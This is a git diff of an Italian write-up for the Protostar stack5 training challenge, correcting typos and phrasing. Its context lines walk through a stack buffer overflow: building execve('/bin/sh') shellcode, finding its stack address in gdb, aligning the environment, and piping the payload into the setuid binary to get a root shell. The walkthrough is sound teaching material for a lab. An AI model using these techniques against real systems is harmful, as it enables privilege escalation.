@@ -1,4 +1,4 @@
-# Protostar_stack 5 - Stack-based buffer overflow per iniettare codice arbitraeio
+# Protostar_stack 5 - Stack-based buffer overflow per iniettare codice arbitrario
 
 ## Obiettivo della sfida
 Esecuzione di codice arbitrario a tempo di esecuzione
@@ -9,7 +9,7 @@ Nelle sfide precedenti sapevamo cosa iniettare(la funzione _win()_) in questa in
 Potremo utilizzare il codice iniettato per far eseguire una shell.
 
 ## Strategia di attacco
-Produrre un input contenente lo **shellcode** in codifica esadecimale, i caratteri di **padding** fino all'indirizzo di ritorno, **indirizzo iniziale dello shell code** da scrivere nella cella dell'indirizzo di ritorno.  
+Produrre un input contenente lo **shellcode** in codifica esadecimale, i caratteri di **padding** fino all'indirizzo di ritorno e l'**indirizzo iniziale dello shell code** da scrivere nella cella dell'indirizzo di ritorno.  
 Dando quest input a **stack5** otteniamo una shell di root poichè stack5 è SETUID root.
 
 ### Preparazione dello shellcode
@@ -31,12 +31,14 @@ I registri usati per le chiamate di sistema sono:
 - **EBX**: primo argomento
 - **ECX**: secondo argomento
 - **EDX**: terzo argomento
+
 Per convenzione il registro usato per il valore di ritorno è **EAX**
 
 ### I nostri parametri
 - **EBX**: filename = /bin/sh
 - **ECX**: {NULL}
 - **EDX**: {NULL}
+
 Il valore di ritorno di _execve_ non viene utilizzato quindi non generiamo codice per gestirlo.
 
 ### Scriviamo l'assembly 
@@ -70,7 +72,7 @@ con -m32 compiliamo a 32bit e con -c non generiamo l'eseguibile
 Utiliziamo _objdump_ per disassemblare _shellcode.o_
 ```bash
 > objdump --disassemble shellcode.o
-# l'output è composta dalle istruzioni in esadecimale
+# l'output è composto dalle istruzioni assembly in esadecimale
 ```
 #### 4. Codifica delle istruzioni 
 Codifichiamo le istruzioni esadecimali sotto forma di stringa e otteniamo:
@@ -109,7 +111,7 @@ L'ampiezza dell'area di memoria è di 76 byte:
 - 28 per lo shellcode
 - 36 per il buffer
 - 8 per il padding
-- 4 indirizzo della leave
+- 4 cella prima dell'indirizzo di ritorno
 
 Stampiamo l'indirizzo iniziale dello shellcode, esso è contenuto in $esp
 ```bash
@@ -120,7 +122,7 @@ $7= (void *) 0xbffffc90
 0xbffffc90: 
 #0xbffffca0 indirizzo iniziale di shellcode
 ```
-0xbffffca0 va inserito nello script python nella variabile ret
+0xbffffca0 va inserito nello script python nella variabile _ret_(indirizzo di ritorno)
 #### 7. Modifichiamo lo script python
 ```python
 #!/usr/bin/python
@@ -150,7 +152,7 @@ Eseguiamo **stack5** con _gdb_
 L'attacco fallisce anche se **stack5** viene eseguito senza gdb
 ## Ipotesi
 Il debugger ha aggiunto delle variabili d'ambiente, questa cosa non ha dato problemi nelle sfide precedenti perchè facevamo riferimento e un indirizzo specifico del programma e non ad un indirizzo assoluto dello stack.  
-Per verificare l'ipotesi lanciamo `env` da terminale e ne analizziamo l'output se è uguale a `gdb show env` possiamo rigettare l'ipotesi. Notiamo che il debugger aggiunge due variabili esse sono _LINEs_ e _COLUMNS_, cancelliamo queste due variabili in maniera tale che i due ambienti tornino di nuovo ugali, per farlo eseguiamo:
+Per verificare l'ipotesi lanciamo `env` da terminale e ne analizziamo l'output se è uguale a `gdb show env` possiamo rigettare l'ipotesi. Notiamo che il debugger aggiunge due variabili esse sono _LINES_ e _COLUMNS_, cancelliamo queste due variabili in maniera tale che i due ambienti tornino di nuovo ugali, per farlo eseguiamo:
 ```bash
 (gdb) > unset env LINES
 (gdb) > unset env COLUMNS
@@ -162,10 +164,10 @@ Per verificare l'ipotesi lanciamo `env` da terminale e ne analizziamo l'output s
 (gdb) > r < /tmp/payload
 #facciamoci stampare il contenuto di $esp
 (gdb) > p $esp
-$7= (void *) 0xbffffcb0!
+$7= (void *) 0xbffffcb0
 (gdb) > x/a $esp
 0xbffffcb0: 0xbffffcc0
-#0xbffffcc0 da impostare come valore di ret
+#0xbffffcc0 da impostare come nuovo valore di ret
 #nello script python
 ```
 ## Esecuzione
@@ -175,7 +177,7 @@ Una volta aggiornato _ret_ con 0xbffffcc0 generiamo il nuovo payload ed eseguiam
 ```
 Notiamo che non si ha un crash ma la shell termina immediatamente perchè lo STDIN è vuoto
 
-### Soluzione a STDIN vuoto
+### Soluzione allo STDIN vuoto
 Bisogna dare alla shell iniettata uno STDIN aperto, per farlo modifichiamo il comando che usiamo per lanciare l'attacco
 ```bash
 > (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
